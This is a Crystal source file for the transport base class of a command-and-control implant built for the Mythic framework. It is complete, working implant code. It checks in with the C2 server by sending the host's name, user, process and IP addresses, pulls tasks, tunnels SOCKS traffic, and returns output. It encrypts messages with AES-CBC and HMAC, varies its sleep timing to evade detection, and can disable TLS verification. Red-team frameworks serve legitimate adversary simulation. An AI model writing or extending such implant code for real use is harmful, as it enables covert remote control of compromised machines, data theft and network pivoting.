require "http/client"
require "json"
require "base64"
require "crypto/subtle"
require "openssl/hmac"
require "openssl/cipher"
require "../config"
require "system/user"
require "../command_handler"
require "../message_handler"
require "../socks_handler"

module Dark::Agent::Transport
  # Base Transport class with common functionality
  #
  # Base class for all transport types with shared encryption, config management,
  # system info gathering, and sleep/jitter implementation. Subclasses implement
  # protocol-specific communication methods.
  abstract class Base
    @payload_uuid : String
    @callback_uuid : String? = nil
    @sleep_time : Int32
    @jitter : Int32
    @checked_in : Bool = false
    @config : Config::Base

    # Allow sleep time and jitter to be modified at runtime
    property sleep_time : Int32
    property jitter : Int32
    property checked_in : Bool

    # Sleep interrupt channel for immediate config changes
    @sleep_interrupt : Channel(Nil) = Channel(Nil).new(1)

    # AGENT INITIALIZATION

    def initialize(config : Config::Base)
      # Store the provided config instance
      @config = config

      # Use the essential configuration from our config instance
      @payload_uuid = @config.payload_uuid
      @sleep_time = @config.sleep_interval
      @jitter = @config.jitter_percent

      # Check for kill date
      check_kill_date
    end

    private def check_kill_date
      if @config.has_kill_date?
        log_debug("Kill date configured: #{@config.killdate}")
        if @config.past_kill_date?
          log_error("Kill date reached. Agent will terminate.")
          exit(0)
        end
      end
    end

    # AGENT COMMUNICATION CORE

    # Sleep for the configured time with jitter, unless sleep_time is 0
    #
    # Implements variable sleep timing with randomized jitter for OPSEC.
    # Skips sleep if sleep_time=0 (polling mode).
    # Uses channel-based interruption for immediate config changes.
    def sleep_with_jitter
      # If sleep time is 0, skip sleep entirely (polling mode)
      if @sleep_time == 0
        return
      end

      # Check if we should skip sleep based on config and message types
      if @config.realtime? && MessageHandler.has_responses?
        return
      end

      # Get a new random number generator
      random = Random.new

      # Check if symmetric jitter is enabled in the configuration
      symmetric_mode = @config.symmetric_jitter?

      if symmetric_mode
        # Symmetric jitter: ranges from (base - jitter%) to (base + jitter%)
        jitter_factor = (random.rand * 2.0 - 1.0) * (@jitter / 100.0)
        jitter_seconds = @sleep_time * (1.0 + jitter_factor)
        jitter_seconds = jitter_seconds.abs
        log_debug("Sleeping for #{jitter_seconds.round(2)}s (base: #{@sleep_time}s, jitter: #{@jitter}%, mode: symmetric)")
      else
        # Traditional positive-only jitter: ranges from base to (base + jitter%)
        jitter_factor = random.rand * (@jitter / 100.0)
        jitter_seconds = @sleep_time * (1.0 + jitter_factor)
        log_debug("Sleeping for #{jitter_seconds.round(2)}s (base: #{@sleep_time}s, jitter: #{@jitter}%, mode: positive-only)")
      end

      # Use select for interruptible sleep
      select
      when timeout(jitter_seconds.seconds)
        # Sleep completed normally
      when @sleep_interrupt.receive
        # Sleep interrupted by config change
      end
    end

    # Interrupt current sleep operation for immediate config changes
    def interrupt_current_sleep
      select
      when @sleep_interrupt.send(nil)
        # Interrupt sent
      else
        # Channel full, ignore
      end
    end

    # MYTHIC CORE METHODS

    # Sends initial check-in information to C2 server
    #
    # Mythic required function: Sends initial agent registration with metadata
    # Returns true if successful with valid callback UUID
    def send_checkin : Bool
      result = false

      begin
        # Prepare checkin data
        checkin_info = gather_system_info

        # Encrypt or encode message
        final_message = if @config.has_encryption?
          encrypt_message(@payload_uuid + checkin_info.to_json)
        else
          buffer = IO::Memory.new
          buffer.write(@payload_uuid.to_slice)
          buffer.write(checkin_info.to_json.to_slice)
          Base64.strict_encode(buffer.to_slice)
        end

        # Send the request and get the response
        response, raw_body = send_request(final_message)

        # Check response status
        if response.nil? || !response.success? || raw_body.nil? || raw_body.empty?
          result = false
          return result
        end

        # Process response data
        response_json = process_response(raw_body)
        if response_json.empty?
          result = false
          return result
        end

        # Parse response JSON
        begin
          checkin_response = JSON.parse(response_json)

          if checkin_response["action"]? == "checkin" &&
             checkin_response["status"]? == "success" &&
             checkin_response["id"]?

            @callback_uuid = checkin_response["id"].as_s
            log_warn("Checkin successful. Callback UUID: #{@callback_uuid}")
            @checked_in = true
            result = true
          end
        rescue ex
          log_error("Failed to parse checkin response: #{ex.message}")
        end
      rescue ex
        log_error("Error during checkin: #{ex.message}")
      end

      # Return the result
      return result
    end

    # Retrieves pending tasks from C2 server
    #
    # Mythic required function: Gets tasks assigned to this agent
    # Returns array of tasks to process
    def receive_tasks : Array(JSON::Any)
      empty_result = [] of JSON::Any

      begin
        unless @callback_uuid
          log_error("No callback UUID available. Cannot get tasks.")
          return empty_result
        end

        callback_id = @callback_uuid.not_nil!

        payload = {
          "action" => "get_tasking",
          "tasking_size" => -1,
          "uuid" => callback_id,
          "payload_uuid" => @payload_uuid
        }

        final_message = prepare_message(callback_id, payload)
        response, raw_body = send_request(final_message)

        if response.nil? || !response.success? || raw_body.nil? || raw_body.empty?
          log_error("Failed to retrieve tasks")
          return empty_result
        end

        response_json = process_response(raw_body)

        if response_json.empty?
          return empty_result
        end

        begin
          data = JSON.parse(response_json)

          # Check for SOCKS datagrams
          if data["socks"]? && !data["socks"].as_a.empty?
            log_debug("Received SOCKS datagrams: #{data["socks"].as_a.size}")

            # Process each SOCKS datagram through the SocksHandler directly
            socks_handler = Dark::Agent::SocksHandler.instance
            data["socks"].as_a.each do |datagram|
              socks_handler.handle_datagram(datagram)
            end
          end

          # Extract tasks if available
          if data["tasks"]? && !data["tasks"].as_a.empty?
            tasks = data["tasks"].as_a
            log_warn("Received #{tasks.size} tasks")
            return tasks
          end

          # If we have a single file_id response at the root level, wrap it as a task
          if data["file_id"]? && !data["file_id"].as_s.empty?
            log_debug("FOUND FILE_ID AT ROOT: #{data["file_id"]}")

            # Create a task out of this response
            file_id_tasks = [data] of JSON::Any
            return file_id_tasks
          end
        rescue ex
          log_error("Failed to parse task response: #{ex.message}")
        end
      rescue ex
        log_error("Error receiving tasks: #{ex.message}")
      end

      return empty_result
    end

    # Send all queued responses to the C2 server
    #
    # Mythic required function: Sends command output back to Mythic server
    def send_responses
      return if !MessageHandler.has_responses?

      begin
        unless @callback_uuid
          log_error("No callback UUID available. Cannot send responses.")
          return
        end

        callback_id = @callback_uuid.not_nil!
        message = MessageHandler.prepare_response
        final_message = prepare_message(callback_id, message)

        # Calculate size for logging
        message_size_kb = final_message.bytesize / 1024
        socks_msg_count = message["socks"]?.try(&.as_a.size) || 0

        # Count delegates across all responses
        delegate_count = 0
        message["responses"].as(JSON::Any).as_a.each do |response|
          if delegates = response["delegates"]?
            delegate_count += delegates.as_a.size
          end
        end

        log_warn("Sending agent messages: #{message["responses"].as(JSON::Any).as_a.size}, socks msgs: #{socks_msg_count}, delegates: #{delegate_count}, size: #{message_size_kb}KB")

        # For large SOCKS payloads, use a non-blocking approach to avoid stalling the main loop
        # But use a much lower threshold to ensure Firefox traffic is handled immediately
        if socks_msg_count > 5 || message_size_kb > 256
          # SOCKS payload - use non-blocking send for better responsiveness
          spawn do
            begin
              resp, body = send_request(final_message)
              if resp.nil? || !resp.success? || body.nil? || body.empty?
                log_error("Failed to send agent messages (async)")
              else
                log_warn("Agent messages sent successfully (async)")
              end
            rescue ex
              log_error("Error in async send: #{ex.message}")
            end
          end
          # Continue agent execution immediately
          return
        else
          # Normal-sized payload - use blocking send
          response, raw_body = send_request(final_message)

          if response.nil? || !response.success? || raw_body.nil? || raw_body.empty?
            log_error("Failed to send agent messages")
            return
          end

        end
      rescue ex
        log_error("Error sending responses: #{ex.message}")
      end
    end

    # FILE TRANSFER HELPERS

    # Helper method to send a message and get a response directly
    #
    # Mythic file transfer: Used for operations requiring immediate response like file chunking
    # Encrypts, sends, and processes response in a single operation
    def send_and_receive(request_json : String) : String
      result = "{}"

      begin
        # Ensure we have a callback UUID
        unless @callback_uuid
          log_error("No callback UUID available. Cannot send request.")
          return result
        end

        # Log what we're sending for debugging
        log_debug("SEND_AND_RECEIVE SENDING: #{request_json}")

        # Prepare the message
        callback_id = @callback_uuid.not_nil!
        request_data = JSON.parse(request_json)

        # Create the HTTP request
        final_message = prepare_message(callback_id, request_data.as_h)

        # Send the HTTP request and get response
        # Subclasses implement the specifics of sending the request
        response, raw_body = send_request(final_message)

        # Process and return the response
        if response.nil? || !response.success? || raw_body.nil? || raw_body.empty?
          log_error("Failed to retrieve response")
        else
          # Process the response
          response_json = process_response(raw_body)
          # log_debug("SEND_AND_RECEIVE GOT RESPONSE: #{response_json}")

          # Check for file_id in response
          begin
            parsed = JSON.parse(response_json)
            if parsed["file_id"]?
              log_debug("SEND_AND_RECEIVE FOUND FILE_ID: #{parsed["file_id"]}")

              # Look for file path in request
              if request_data["responses"]?.try(&.as_a?) && !request_data["responses"].as_a.empty?
                first_resp = request_data["responses"][0]
                if first_resp["download"]?.try(&.as_h?) && first_resp["download"]["full_path"]?
                  file_path = first_resp["download"]["full_path"].as_s
                  file_id = parsed["file_id"].as_s
                  log_debug("ASSOCIATING FILE_ID WITH PATH: #{file_id} -> #{file_path}")
                end
              end
            end
          rescue ex
            log_error("Error parsing JSON for file_id check: #{ex.message}")
          end

          result = response_json.empty? ? "{}" : response_json
        end
      rescue ex
        log_error("Error in send_and_receive: #{ex.message}")
      end

      # Only sleep if we're not in zero-sleep polling mode
      # This dramatically improves SOCKS performance
      if @sleep_time != 0
        sleep_with_jitter
      end
      return result
    end

    # SYSTEM INFO GATHERING

    # Build checkin data payload for C2 registration
    #
    # Collects system details (hostname, username, IPs) and encryption keys
    # for initial C2 registration and agent identification.
    protected def gather_system_info
      # Create a simple hash with string values
      checkin_data = {
        "action"       => "checkin",
        "uuid"         => @payload_uuid,
        "host"         => System.hostname,
        "user"         => get_username,
        "pid"          => Process.pid.to_i,
        "process_name" => Process.executable_path,
        "ips"          => get_ips,
        "sleep_info"   => {"interval" => @sleep_time, "jitter" => @jitter}.to_json
      }

      # Include encryption keys if enabled
      if @config.has_encryption?
        checkin_data["encryption_key"] = @config.encryption_key
        checkin_data["decryption_key"] = @config.decryption_key
      end

      checkin_data
    end

    # Get the username using several techniques
    private def get_username : String
      ENV["USER"]? || ENV["LOGNAME"]? || ENV["USERNAME"]? || System::User.find_by(id: LibC.getuid.to_s).try(&.username) || "unkn0wn"
    end

    # Get all IP addresses on the system
    private def get_ips
      Socket::Addrinfo.tcp(System.hostname, 0, timeout: nil).map(&.ip_address).map(&.address)
    end

    # ENCRYPTION AND MESSAGE HANDLING

    # Encrypt message using AES-256-CBC with HMAC (Mythic format)
    #
    # Mythic encryption format: Base64(PayloadUUID + IV + AES256(JSON_content) + HMAC)
    # Uses AES-256-CBC with random IV and HMAC-SHA256 authentication
    protected def encrypt_message(message : String) : String
      return message unless @config.has_encryption?

      begin
        # Split UUID (first 36 chars) from message content
        uuid = message[0, 36]
        message_content = message[36..]

        # Decode encryption key
        enc_key = Base64.decode(@config.encryption_key)

        # Generate random IV
        iv = Random.new.random_bytes(16)

        # Set up cipher for AES-256-CBC
        cipher = OpenSSL::Cipher.new("AES-256-CBC")
        cipher.encrypt
        cipher.key = enc_key[0, 32]
        cipher.iv = iv

        # Encrypt message content (not UUID)
        encrypted = cipher.update(message_content) + cipher.final

        # Generate HMAC for IV + encrypted data
        data_to_hmac = iv + encrypted
        hmac = OpenSSL::HMAC.digest(:sha256, enc_key, data_to_hmac)

        # Format: Base64(UUID + IV + Encrypted + HMAC) - Mythic format
        final_bytes = IO::Memory.new
        final_bytes.write(uuid.to_slice)
        final_bytes.write(iv)
        final_bytes.write(encrypted)
        final_bytes.write(hmac)

        # Return Base64 encoded final result
        Base64.strict_encode(final_bytes.to_slice)
      rescue ex
        log_error("Error during encryption: #{ex.message}")
        raise ex
      end
    end

    # Decrypt message using AES-256-CBC with HMAC (Mythic format)
    #
    # Mythic decryption format: Base64(PayloadUUID + IV + AES256(JSON_content) + HMAC)
    # Uses AES-256-CBC with HMAC-SHA256 authentication
    protected def decrypt_message(encoded_message : String) : String
      return encoded_message unless @config.has_encryption?

      begin
        # Handle non-base64 input by encoding it first
        if encoded_message.size % 4 != 0 || !encoded_message.matches?(/^[A-Za-z0-9+\/=]+$/)
          # For binary data that might not be valid UTF-8, we need to handle it as bytes
          begin
            encoded_message = Base64.strict_encode(encoded_message.to_slice)
          rescue ex
            # If we can't convert to slice (invalid UTF-8), try with unsafe conversion
            encoded_message = Base64.strict_encode(encoded_message.to_unsafe.to_slice(encoded_message.bytesize))
          end
        end

        decoded_bytes = Base64.decode(encoded_message)

        # Basic size validation - UUID(36) + IV(16) + HMAC(32) = 84 minimum
        if decoded_bytes.size < 84
          return ""
        end

        # Extract components following Medusa format
        uuid = String.new(decoded_bytes[0, 36])
        iv = decoded_bytes[36, 16]
        hmac_start = decoded_bytes.size - 32
        encrypted = decoded_bytes[52, hmac_start - 52]
        received_hmac = decoded_bytes[hmac_start, 32]

        # Decode decryption key
        dec_key = Base64.decode(@config.decryption_key)

        # Verify HMAC (over IV + encrypted data)
        data_to_verify = iv + encrypted
        calculated_hmac = OpenSSL::HMAC.digest(:sha256, dec_key, data_to_verify)

        if Crypto::Subtle.constant_time_compare(received_hmac, calculated_hmac)
          # HMAC is valid, proceed with decryption
          decipher = OpenSSL::Cipher.new("AES-256-CBC")
          decipher.decrypt
          decipher.key = dec_key[0, 32]
          decipher.iv = iv
          decrypted = decipher.update(encrypted) + decipher.final

          # Convert the decrypted bytes to a proper string
          return String.new(decrypted)
        else
          log_error("HMAC verification failed during decryption")
          return ""
        end
      rescue ex
        log_error("Error during decryption: #{ex.message}")
        return ""
      end
    end

    # Helper to prepare message for sending
    protected def prepare_message(callback_id : String, payload : Hash) : String
      # Convert any hash to a properly formatted message
      message = callback_id + payload.to_json

      if @config.has_encryption?
        encrypt_message(message)
      else
        # For unencrypted messages, properly handle binary data
        buffer = IO::Memory.new
        buffer.write(callback_id.to_slice)
        buffer.write(payload.to_json.to_slice)
        Base64.strict_encode(buffer.to_slice)
      end
    end

    # HTTP COMMUNICATION

    # Helper method to send HTTP request and capture response using a full URL
    protected def send_http_request(full_url : String, headers : ::HTTP::Headers, body : String, method : String = "POST") : {::HTTP::Client::Response?, String?}
      # Build full URL
      log_debug("#{method} request to #{full_url} | body size: #{body.size}B")
      response = nil
      response_body = nil

      begin
        # Set up HTTP::Client with SSL verification options
        uri = URI.parse(full_url)

        # Create client based on URL scheme (HTTP or HTTPS)
        client = if uri.scheme == "https"
          context = OpenSSL::SSL::Context::Client.new
          if @config.disable_ssl_verify?
            context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
          end
          ::HTTP::Client.new(uri, tls: context)
        else
          ::HTTP::Client.new(uri)
        end

        # Set increased timeouts for better reliability over high-latency connections
        client.connect_timeout = 20.seconds
        client.read_timeout = 60.seconds

        # Build request path (everything after the domain)
        request_path = uri.request_target

        # Execute the request - always use POST method with block format
        client.post(request_path, headers: headers, body: body) do |resp|
          response = resp
          io = IO::Memory.new
          IO.copy(resp.body_io, io)
          response_body = io.to_s
        end

        # Clean up client
        client.close

        {response, response_body}
      rescue ex
        log_error("HTTP request error: #{ex.message}")
        {nil, nil}
      end
    end

    # ABSTRACT METHODS FOR SUBCLASSES

    # Process response body - to be implemented by subclasses
    abstract def process_response(raw_body : String) : String

    # Send an HTTP request - to be implemented by subclasses
    abstract def send_request(message : String) : {::HTTP::Client::Response?, String?}
  end
end